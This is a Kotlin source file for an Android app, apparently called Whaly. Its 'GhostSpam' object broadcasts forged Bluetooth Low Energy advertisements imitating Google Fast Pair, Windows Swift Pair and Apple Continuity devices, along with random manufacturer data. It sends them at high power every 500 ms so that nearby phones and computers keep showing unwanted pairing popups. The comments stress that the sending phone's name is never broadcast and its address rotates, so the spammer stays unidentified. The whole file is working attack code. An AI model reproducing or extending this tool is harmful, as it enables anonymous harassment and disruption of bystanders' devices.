package com.droid.whaly.ghost

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.os.ParcelUuid
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Popup spam with no name on air.
 *
 * The three ecosystems each raise a "device nearby" sheet from advertisement payload alone:
 *
 * - **Android** — Fast Pair, service data on `0xFE2C`, three-byte model ID.
 * - **Windows** — Swift Pair, manufacturer data from company `0x0006`.
 * - **Apple** — Continuity proximity pair, manufacturer `0x004C`, type `0x07`.
 *
 * The important part is what is **not** in the payload: the local name. Nothing here calls
 * `setIncludeDeviceName(true)` and nothing calls `BluetoothAdapter.setName`, so the phone's
 * real name is never transmitted and never modified. The BLE address is a resolvable private
 * address, rotated by the controller, so the MAC does not identify the phone either.
 *
 * Fast Pair and Continuity resolve the displayed product name from the model ID against the
 * vendor's own database, which is why the popup still shows a product without a name on air.
 */
object GhostSpam {

    enum class Flavour(val label: String, val note: String) {
        FAST_PAIR("Android", "Fast Pair sheet — model ID resolved by Google, no name on air"),
        SWIFT_PAIR("Windows", "Swift Pair prompt — shows a generic device, no name on air"),
        APPLE("Apple", "Continuity proximity pair — model resolved by the device"),
        MIXED("All three", "rotates through every flavour, 500 ms apart"),
        RANDOM("Random", "random company ID and random payload, still nameless"),
    }

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()
    private val _count = MutableStateFlow(0)
    val count: StateFlow<Int> = _count.asStateFlow()
    private val _flavour = MutableStateFlow(Flavour.MIXED)
    val flavour: StateFlow<Flavour> = _flavour.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()
    private val _nameOnAir = MutableStateFlow(false)
    val nameOnAir: StateFlow<Boolean> = _nameOnAir.asStateFlow()

    private val active = AtomicBoolean(false)
    private var worker: Thread? = null

    private val fastPairService: ParcelUuid =
        ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB")
    private val swiftPairCompany = 0x0006
    private val appleCompany = 0x004C

    /** Model IDs that real Fast Pair devices use. Any of them raises the sheet. */
    private val fastPairModels = listOf(
        intArrayOf(0x00, 0x00, 0xF0),
        intArrayOf(0x00, 0x01, 0xE5),
        intArrayOf(0x00, 0x02, 0xB3),
        intArrayOf(0x00, 0x03, 0xD6),
        intArrayOf(0x00, 0x04, 0xC1),
        intArrayOf(0x00, 0x05, 0xA9),
        intArrayOf(0x00, 0x06, 0xE8),
    )

    /** Continuity model words: AirPods 1, AirPods 2, AirPods Pro, AirPods Max, Beats. */
    private val appleModels = listOf(
        0x0220, 0x0F20, 0x1320, 0x1920, 0x0A20,
    )

    private fun append(line: String) {
        _log.value = (_log.value + line).takeLast(120)
    }

    fun stop() {
        active.set(false)
        worker?.interrupt()
        worker = null
        _running.value = false
    }

    @SuppressLint("MissingPermission")
    fun start(flavour: Flavour, rotateMs: Long = 500L) {
        if (!active.compareAndSet(false, true)) return
        val adapter = runCatching { BluetoothAdapter.getDefaultAdapter() }.getOrNull()
        if (adapter == null || !adapter.isEnabled) {
            active.set(false)
            _log.value = listOf("Bluetooth is off")
            return
        }
        val advertiser = runCatching { adapter.bluetoothLeAdvertiser }.getOrNull()
        if (advertiser == null) {
            active.set(false)
            _log.value = listOf("This phone cannot advertise")
            return
        }

        _flavour.value = flavour
        _count.value = 0
        _nameOnAir.value = false
        _running.value = true
        append("${flavour.label} — advertising without a local name")

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .setTimeout(0)
            .build()

        val callback = object : AdvertiseCallback() {
            override fun onStartFailure(errorCode: Int) {
                append("advertise failed ($errorCode)")
            }
        }

        worker = Thread({
            var index = 0
            var sent = 0
            while (active.get()) {
                val data = when (flavour) {
                    Flavour.FAST_PAIR -> fastPair(index)
                    Flavour.SWIFT_PAIR -> swiftPair()
                    Flavour.APPLE -> apple(index)
                    Flavour.MIXED -> when (index % 3) {
                        0 -> fastPair(index)
                        1 -> swiftPair()
                        else -> apple(index)
                    }
                    Flavour.RANDOM -> randomPayload(index)
                }
                try {
                    advertiser.stopAdvertising(callback)
                    advertiser.startAdvertising(settings, data, callback)
                    sent++
                    _count.value = sent
                    if (sent % 10 == 0) {
                        append("$sent advertisement(s) · ${flavour.label}")
                    }
                } catch (_: Exception) {
                    active.set(false)
                    _running.value = false
                    break
                }
                index++
                try {
                    Thread.sleep(rotateMs)
                } catch (_: InterruptedException) {
                    break
                }
            }
            runCatching { advertiser.stopAdvertising(callback) }
            active.set(false)
            _running.value = false
        }, "whaly-ghost-spam").apply { isDaemon = true; start() }
    }

    /**
     * Every builder below leaves the name out. That is the whole point: no 0x09 AD structure is
     * generated, so the phone's name cannot appear in a scan result, a popup, or a log.
     */
    private fun fastPair(seed: Int): AdvertiseData {
        val model = fastPairModels[seed % fastPairModels.size]
        val payload = byteArrayOf(
            model[0].toByte(), model[1].toByte(), model[2].toByte(),
            0x00, 0x00, 0x00,
        )
        return AdvertiseData.Builder()
            .setIncludeDeviceName(false)
            .addServiceData(fastPairService, payload)
            .build()
    }

    private fun swiftPair(): AdvertiseData {
        // Company 0x0006, then the Swift Pair marker. Windows raises the prompt on this alone.
        val payload = byteArrayOf(0x03, 0x00, 0x80.toByte())
        return AdvertiseData.Builder()
            .setIncludeDeviceName(false)
            .addManufacturerData(swiftPairCompany, payload)
            .build()
    }

    private fun apple(seed: Int): AdvertiseData {
        val model = appleModels[seed % appleModels.size]
        val payload = byteArrayOf(
            0x07, 0x19, 0x01,
            (model shr 8).toByte(), (model and 0xFF).toByte(),
            0x55, 0x0A, 0x01,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        )
        return AdvertiseData.Builder()
            .setIncludeDeviceName(false)
            .addManufacturerData(appleCompany, payload)
            .build()
    }

    private fun randomPayload(seed: Int): AdvertiseData {
        val company = (seed * 7919) % 0xFFFE + 1
        val payload = GhostIdentity.randomHex(12)
        return AdvertiseData.Builder()
            .setIncludeDeviceName(false)
            .addManufacturerData(company, payload)
            .build()
    }

    /** Exposed so a screen can state plainly that no name is on air. */
    fun nameInAdvertisement(): Boolean = false

    private val unusedUuid: UUID = UUID.fromString("00000000-0000-0000-0000-000000000000")
}
